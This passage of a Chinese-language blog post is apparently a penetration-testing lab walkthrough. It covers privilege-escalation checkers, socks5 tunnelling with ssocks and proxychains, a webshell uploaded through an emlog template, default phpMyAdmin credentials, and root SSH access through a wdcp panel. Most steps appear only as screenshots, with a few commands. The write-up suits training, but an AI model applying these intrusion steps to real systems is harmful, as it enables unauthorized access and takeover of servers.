+<p>扫描结果 </p>
+<p><img src="https://i.loli.net/2021/10/03/nYLZjkC3h2J1y9m.png" alt="Untitled"></p>
+<h3 id="linux-exploit-suggester的使用"><a href="#linux-exploit-suggester的使用" class="headerlink" title="linux-exploit-suggester的使用"></a>linux-exploit-suggester的使用</h3><p>这个用来检测是否存在提权 cve 漏洞</p>
+<p><img src="https://i.loli.net/2021/10/03/3c2O1WhyP6lwx74.png" alt="Untitled"></p>
+<h3 id="linuxprivchecker"><a href="#linuxprivchecker" class="headerlink" title="linuxprivchecker"></a>linuxprivchecker</h3><p>检测权限以及提权漏洞检测等</p>
+<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2052.png" alt="Untitled"></p>
+<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2053.png" alt="Untitled"></p>
+<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2054.png" alt="Untitled"></p>
+<h2 id="Linux-socks5内网穿透"><a href="#Linux-socks5内网穿透" class="headerlink" title="Linux socks5内网穿透"></a>Linux socks5内网穿透</h2><p>1、下载ssocks0.0.1并编译</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure &amp;&amp; make</span><br></pre></td></tr></table></figure>
+<p>2、进入ssocks\src目录，攻击机执行rcsocks</p>
+<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2055.png" alt="Untitled"></p>
+<p>3、进入内网1号机，执行rssocks程序</p>
+<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2056.png" alt="Untitled"></p>
+<p>4、攻击机设置proxychains代理</p>
+<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2057.png" alt="Untitled"></p>
+<p>使用proxychains代理扫描内网2号机开放的端口，此时应正常扫描，说明内网穿透成功</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains3 nmap -sT -Pn <span class="number">10.10</span><span class="number">.10</span><span class="number">.128</span></span><br></pre></td></tr></table></figure>
+<p>在浏览器里直接设置socks代理就可以直接访问web网页</p>
+<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2058.png" alt="Untitled"></p>
+<p>ddd5.com是内网2号机上部署的网站，ip为10.10.10.128，攻击机可以直接访问，也可以说明内网穿越成功</p>
+<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2059.png" alt="Untitled"></p>
+<h2 id="模板上传getshell"><a href="#模板上传getshell" class="headerlink" title="模板上传getshell"></a>模板上传getshell</h2><p>查看内网1号机的hosts文件，绑定<a target="_blank" rel="noopener" href="http://www.ddd5.com,进入发现是一个博客,采用emlog搭建/">www.ddd5.com，进入发现是一个博客，采用emlog搭建</a></p>
+<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2060.png" alt="Untitled"></p>
+<p>admin\123456进入后台可以直接上传模板，可以照着emlog模板复制一份，另外加上大马和一句话木马，压缩成zip后上传</p>
+<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2061.png" alt="Untitled"></p>
+<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2062.png" alt="Untitled"></p>
+<p>访问大马</p>
+<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2063.png" alt="Untitled"></p>
+<p>一句话木马执行命令</p>
+<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2064.png" alt="Untitled"></p>
+<h2 id="蚁剑穿透内网"><a href="#蚁剑穿透内网" class="headerlink" title="蚁剑穿透内网"></a>蚁剑穿透内网</h2><p>创建一个虚拟机windows7，确保可以跟内网1号机通信，因为1号机之前已经设置了代理，可以直接穿透内网</p>
+<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2065.png" alt="Untitled"></p>
+<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2066.png" alt="Untitled"></p>
+<p>下面设置代理，不过不设置也可以连通 </p>
+<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2067.png" alt="Untitled"></p>
+<p>进入命令行，查看可以登陆的用户信息 </p>
+<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2068.png" alt="Untitled"></p>
+<h2 id="wdcp系统提权"><a href="#wdcp系统提权" class="headerlink" title="wdcp系统提权"></a>wdcp系统提权</h2><p>访问内网2号机发现是wdlinux</p>
+<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2069.png" alt="Untitled"></p>
+<p>进入8080端口访问wdcp登陆面板</p>
+<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2070.png" alt="Untitled"></p>
+<p>登陆面板进不去，不过有个phpmyadmin面板可以进去，用root\wdlinux.cn登陆进去了 </p>
+<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2071.png" alt="Untitled"></p>
+<p>找到登陆面板的用户名和密码，admin\moonsec123</p>
+<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2072.png" alt="Untitled"></p>
+<p>进来了 </p>
+<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2073.png" alt="Untitled"></p>
+<p>有一个命令运行器，可以看到是root权限  </p>
+<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2074.png" alt="Untitled"></p>
+<p>尝试反弹shell，提示危险命令</p>
+<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2075.png" alt="Untitled"></p>
+<p>ssh管理，这里可以下载密钥，在下载之前需要先点击生成密钥</p>
+<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2076.png" alt="Untitled"></p>
+<p>通过内网穿透代理直接ssh登陆</p>
+<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2077.png" alt="Untitled"></p>
+<p>可以看到是root权限 </p>
+<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2078.png" alt="Untitled"></p>
+<p>先玩到这里~谢谢观看</p>
+
+  </div>
+  <div class="post-meta">
+    <span class="post-time" style="color:#646060;font-size:13px">2021-10-03</span>
+  </div>
+
+  <div class="post-footer">
+    
+
+    <a href="#top" class="top">返回顶部</a>
+  </div>
+</article>
+
+<!-- 评论插件 -->
+
+<footer>
+  2021
+  <span class="author">
+    tutucoo
+  </span>
+</footer>
+
+
+    </div>
+  </body>
+</html>
